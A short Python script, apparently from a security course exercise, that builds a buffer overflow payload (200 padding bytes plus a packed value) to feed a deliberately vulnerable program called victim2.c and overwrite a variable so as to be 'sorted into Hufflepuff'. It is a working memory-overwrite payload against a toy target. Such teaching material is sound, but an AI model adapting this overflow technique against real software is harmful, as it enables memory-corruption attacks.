import struct
import sys

# I want to get into Hufflepuff, so the padding is set accordingly

# Setting the padding size
padding_size = 200

# Value to overwrite to get into Hufflepuff
hufflepuff_value = struct.pack("<I", 0x1badb002)

#----------------------------
# Creating the payload
#----------------------------
payload = b'A' * padding_size
payload += hufflepuff_value

# Printing it out to stdout so that it can be input to the victim2.c file
sys.stdout.buffer.write(payload)